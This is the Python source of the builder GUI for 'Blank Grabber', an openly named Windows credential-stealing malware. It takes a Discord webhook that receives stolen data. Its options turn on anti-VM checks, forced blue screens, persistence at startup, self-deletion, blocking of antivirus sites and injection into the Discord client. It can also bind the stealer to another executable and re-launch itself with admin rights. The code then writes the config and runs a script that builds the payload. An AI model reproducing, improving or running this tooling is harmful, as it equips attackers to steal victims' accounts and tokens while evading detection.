import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from urllib.request import urlopen, Request
from socket import create_connection
import json, os, subprocess, shutil, webbrowser, ctypes, sys

def ToggleConsole(choice):
	if choice:
		# Show Console
		ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
	else:
		# Hide Console
		ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    except Exception:
        return False

class Builder:
	def __init__(self):
		self.root = tk.Tk()
		self.iconFileData = bytes()
		self.boundFileData = bytes()
		self.PingME = tk.BooleanVar(self.root, True)
		self.VMprotect = tk.BooleanVar(self.root, True)
		self.BSOD = tk.BooleanVar(self.root, True)
		self.Startup = tk.BooleanVar(self.root, True)
		self.Destruct = tk.BooleanVar(self.root, True)
		self.blockSites = tk.BooleanVar(self.root, False)
		self.injectJS = tk.BooleanVar(self.root, True)
		self.MSGbox = tk.BooleanVar(self.root, False)
		self.MSGboxconf = dict()
		self.__main__()

	def __main__(self):
		self.root.title("Blank Grabber Builder")
		self.root.geometry("800x365")
		self.root.resizable(False, False)
		self.root['background'] = "black"
		self.root.bind("<Enter>", lambda event: self.WindowOpacity(event, 1))
		self.root.bind("<Leave>", lambda event: self.WindowOpacity(event, 0))
		self.root.bind("<Button-1>", lambda event: self.removeFocus(event))

		ttk.Label(text= "Blank Grabber", font= ("Franklin Gothic", 18, "bold"), foreground= "white", background= "black").place(relx= 0.5, anchor= "n")
		webhookEntry = ttk.Entry(self.root, foreground= "grey", background= "#303841")
		webhookEntry.insert(0, "Enter Webhook Here")
		webhookEntry.bind("<ButtonRelease-1>", lambda event: self.EntryHint(event, "Enter Webhook Here"))
		webhookEntry.bind("<FocusOut>", lambda event: self.EntryHint(event, "Enter Webhook Here"))
		webhookEntry.bind("<FocusIn>", lambda event: self.EntryHint(event, "Enter Webhook Here"))
		webhookEntry.place(x= 20, y= 60, height= 30, width= 750)
		testHook_button= tk.Button(self.root, text= "Test Webhook", command= lambda: self.testHook(webhookEntry.get()), background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15)
		testHook_button.place(x = 770, anchor= "e", y= 110)
		PingME = tk.Checkbutton(self.root, text= "Ping Me", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.PingME)
		BSOD = tk.Checkbutton(self.root, text= "BSOD", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.BSOD)
		VMprotect = tk.Checkbutton(self.root, text= "VM Protect", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.VMprotect, command= lambda: self.ToggleBsod(BSOD))
		Startup = tk.Checkbutton(self.root, text= "Run On Startup", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Startup)
		Destruct = tk.Checkbutton(self.root, text= "Delete Self", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Destruct)
		blockSites = tk.Checkbutton(self.root, text= "Block AV Sites", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.blockSites)
		injectJS = tk.Checkbutton(self.root, text= "Discord Injection", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.injectJS)
		Messagebox = tk.Checkbutton(self.root, text= "Message Box", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.MSGbox, command= self.MessageboxEvent)

		PingME.place(y = 100, x= 20)
		VMprotect.place(y = 130, x= 20)
		BSOD.place(y= 160, x= 20)
		Startup.place(y= 190, x= 20)
		Destruct.place(y= 220, x= 20)
		injectJS.place(y= 250, x= 20)
		blockSites.place(y= 280, x= 20)
		Messagebox.place(y= 310, x= 20)

		IconNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center")
		IconNameLabel.place(x= 560, y= 130, anchor= "e")
		IconNameLabel.bind("<ButtonRelease-1>", lambda event: self.unselectIcon(event))
		IconButton = tk.Button(text= "Select Icon", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: self.selectIcon(IconNameLabel))
		IconButton.place(x= 560, y= 110, anchor= "e")

		BoundFileNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center")
		BoundFileNameLabel.place(x= 560, y= 200, anchor= "e")
		BoundFileNameLabel.bind("<ButtonRelease-1>", lambda event: self.unBind(event))
		BindButton = tk.Button(text= "Bind Executable", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: self.BindFileSelect(BoundFileNameLabel))
		BindButton.place(x= 560, y= 180, anchor= "e")

		GithubButton = tk.Button(text= "Github", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: webbrowser.open("https://github.com/Blank-c/Blank-Grabber", new= 2))
		GithubButton.place(x= 770, y= 180, anchor= "e")

		BuildButton = tk.Button(text= "Build", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font = ("Franklin Gothic", 10, "bold"), command= lambda: self.Build(webhookEntry.get()))
		BuildButton.place(y= 260, x= 770, anchor= "e")

		self.root.mainloop()

	def Build(self, hook):
		def Exit(exitcode= 0):
			os.system("pause > NUL")
			os._exit(exitcode)

		def clear():
			os.system("cls")

		def format1(title, description= ""):
			return f"[{title}\u001b[0m] \u001b[37;1m{description}\u001b[0m"

		if not hook.startswith(("http://", "https://")):
			messagebox.showerror("Invalid Webhook", "The discord webhook you entered is invalid!")
			return
		if not self.checkInternetConnection():
			messagebox.showerror("Error", "Unable to connect to the internet!")
			return

	
		ToggleConsole(True)
		self.root.destroy()
		ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True )
		clear()

		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
			if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
				print(format1("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
				res = subprocess.run("python -m venv env", capture_output= True, shell= True)
				clear()
				if res.returncode != 0:
					print('Error while creating virtual environment ("python -m venv env"): {}'.format(res.stderr.decode(errors= "ignore")))
					Exit(1)

			print(format1("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
			for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Data")):
				if os.path.isfile(fileloc := os.path.join(datadir, i)):
					shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
				else:
					shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
		with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
			if not self.MSGbox.get():
				self.MSGboxconf = dict()
			configuration = {
					"PINGME" : self.PingME.get(),
					"VMPROTECT" : self.VMprotect.get(),
					"BSOD" : self.BSOD.get(),
    				"STARTUP" : self.Startup.get(),
    				"DELETE_ITSELF" : self.Destruct.get(),
				    "BLOCK_SITES" : self.blockSites.get(),
				    "INJECT_JS" : self.injectJS.get(),
					"MSGBOX" : self.MSGboxconf
			}
			json.dump(configuration, file, indent= 4)
		clear()
		with open(os.path.join("env", "Scripts", "webhook.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
			file.write(hook)
		os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
		if os.path.isfile("icon.ico"):
			os.remove("icon.ico")
		if os.path.isfile("bound.exe"):
			os.remove("bound.exe")
		if len(self.iconFileData):
			with open("icon.ico", "wb") as file:
				file.write(self.iconFileData)
		if len(self.boundFileData):
			with open("bound.exe", "wb") as file:
				file.write(self.boundFileData)
		os.startfile("run.bat")

	def checkInternetConnection(self):
		try:
			create_connection(("1.1.1.1", 53))
			return True
		except OSError:
			return False

	def selectIcon(self, FileNameLabel):
		filetypes = (
			("Icon File", ".ico"),
			)
		fileloc = filedialog.askopenfilename(title= "Select icon", initialdir= os.path.join(os.getenv("userprofile"), "Pictures"), filetypes= filetypes)
		if os.path.isfile(fileloc):
			with open(fileloc, "rb") as file:
				self.iconFileData = file.read()
			FileNameLabel['text'] = os.path.basename(fileloc)
	
	def BindFileSelect(self, FileNameLabel):
		filetypes = (
			("Executable File", ".exe"),
			)
		fileloc = filedialog.askopenfilename(title= "Select file", initialdir= ".", filetypes= filetypes)
		if os.path.isfile(fileloc):
			with open(fileloc, "rb") as file:
				self.boundFileData = file.read()
			FileNameLabel['text'] = os.path.basename(fileloc)

	def unselectIcon(self, event):
		event.widget['text'] = str()
		self.iconFileData = bytes()

	def unBind(self, event):
		event.widget['text'] = str()
		self.boundFileData = bytes()

	def ToggleBsod(self, BSOD):
		if not self.VMprotect.get():
			BSOD["state"] = "disabled"
			self.BSOD.set(False)
		else:
			BSOD["state"] = "normal"
			self.BSOD.set(True)

	def removeFocus(self, event):
		if not isinstance(event.widget, ttk.Entry):
			self.root.focus()

	def testHook(self, hook):
		if not hook.startswith(("http://", "https://")):
			messagebox.showerror("Invalid Webhook", "The discord webhook you entered is invalid!")
			return
		if not self.checkInternetConnection():
			messagebox.showerror("Error", "Unable to connect to the internet!")
			return
		data = json.dumps({"content" : "Your webhook is working!"})
		req = Request(url= hook, data= data.encode(), method= "POST", headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
		try:
			if (status := urlopen(req).status) == 204:
				messagebox.showinfo("Working", "Your webhook is working!")
			else:
				raise Exception()
		except Exception:
			messagebox.showwarning("Warning", "It looks like your webhook is not working!")
	
	def MessageboxEvent(self):
		if not self.MSGbox.get():
			return
		
		newwindow = tk.Toplevel()

		ICONS = {"Stop Mark" : 16, "Question Mark" : 32, "Exclamation Mark" : 48, "Information Mark" : 64}
		BUTTONS = {"OK" : 0, "OK and CANCEL" : 1, "ABORT, RETRY and IGNORE" : 2, "YES, NO and CANCEL" : 3, "YES and NO" : 4, "RETRY and CANCEL" : 5}

		def onClose():
			if not bool(self.MSGboxconf):
				self.MSGbox.set(False)
			newwindow.destroy()

		newwindow["background"] = "black"
		newwindow.grab_set()
		newwindow.resizable(False, False)
		newwindow.protocol("WM_DELETE_WINDOW", onClose)
		newwindow.title("Create message box")
		newwindow.geometry("700x300")

		titleEntry = ttk.Entry(newwindow, foreground= "grey", background= "#303841", )
		titleEntry.insert(0, "Title Here")
		titleEntry.bind("<ButtonRelease-1>", lambda event: self.EntryHint(event, "Title Here"))
		titleEntry.bind("<FocusOut>", lambda event: self.EntryHint(event, "Title Here"))
		titleEntry.bind("<FocusIn>", lambda event: self.EntryHint(event, "Title Here"))
		titleEntry.place(x= 5, y= 20, height= 30, width= 685)

		messageEntry = ttk.Entry(newwindow, foreground= "grey", background= "#303841")
		messageEntry.insert(0, "Message Here")
		messageEntry.bind("<ButtonRelease-1>", lambda event: self.EntryHint(event, "Message Here"))
		messageEntry.bind("<FocusOut>", lambda event: self.EntryHint(event, "Message Here"))
		messageEntry.bind("<FocusIn>", lambda event: self.EntryHint(event, "Message Here"))
		messageEntry.place(x= 5, y= 60, height= 30, width= 685)

		ttk.Label(newwindow, text= "Icon:", background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center").place(x= 5, y= 120)

		iconBox = ttk.Combobox(newwindow, values= list(ICONS.keys()), justify= "center", state= "readonly")
		iconBox.current(3)
		iconBox.place(x= 80, y= 120)

		ttk.Label(newwindow, text= "Button:", background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center").place(x= 450, y= 120)

		buttonBox = ttk.Combobox(newwindow, values= list(BUTTONS.keys()), justify= "center", state= "readonly")
		buttonBox.current(0)
		buttonBox.place(x= 530, y= 120)

		testButton = tk.Button(newwindow, text= "Test", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font = ("Franklin Gothic", 10, "bold"), command= lambda: self.MessageBoxTest(iconBox, buttonBox, ICONS, BUTTONS, titleEntry, messageEntry))
		testButton.place(x= 540, y= 200, anchor= "w")

		SaveButton = tk.Button(newwindow, text= "Save", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font = ("Franklin Gothic", 10, "bold"), command= lambda: self.MessageBoxSave(newwindow, iconBox, buttonBox, ICONS, BUTTONS, titleEntry, messageEntry))
		SaveButton.place(x= 90, y= 200, anchor= "w")
	
	def MessageBoxSave(self, window, iconbox, buttonbox, ICONS, BUTTONS, titlebox, messagebox):
		config = {
			"title" : titlebox.get(),
			"message" : messagebox.get(),
			"icon" : ICONS[iconbox.get()],
			"buttons" : BUTTONS[buttonbox.get()]
		}

		self.MSGboxconf = config
		self.MSGbox.set(True)
		window.destroy()

	def MessageBoxTest(self, iconbox, buttonbox, ICONS, BUTTONS, titlebox, messagebox):
		config = {
			"title" : titlebox.get(),
			"message" : messagebox.get(),
			"icon" : ICONS[iconbox.get()],
			"buttons" : BUTTONS[buttonbox.get()]
		}

		self.messagebox(config)

	def messagebox(self, config):
		title = config.get("title")
		message = config.get("message")
		icon = config.get("icon")
		buttons = config.get("buttons")

		if not all(x is not None for x in (title, message, icon, buttons)):
			return
        
		title = title.replace("\x22", "\\x22").replace("\x27", "\\x22")
		message = message.replace("\x22", "\\x22").replace("\x27", "\\x22")
        
		cmd = f'''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{message}', 0, '{title}', {icon}+{buttons});close()"'''
		subprocess.Popen(cmd, shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)

	def WindowOpacity(self, event, mode):
		if not isinstance(event.widget, tk.Tk):
			return
		if mode:
			self.root.attributes("-alpha", 1.0)
		else:
			self.root.attributes("-alpha", 0.7)

	def EntryHint(self, event, text):
		choice = int(event.type)
		if choice in (5, 9):
			if str(event.widget["foreground"]) == "grey":
				event.widget["foreground"] = "black"
				event.widget.delete(0, "end")
		elif choice == 10:
			if str(event.widget["foreground"]) == "black" and not len(event.widget.get()):
				event.widget["foreground"] = "grey"
				event.widget.insert(0, text)

if __name__ == "__main__":
	if os.name == "nt":
		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Data")):
			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Data folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
			os._exit(1)
		ToggleConsole(False)
		if not is_admin():
			ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
			exit()
		Builder()
	else:
		print("Only Windows OS is supported!")
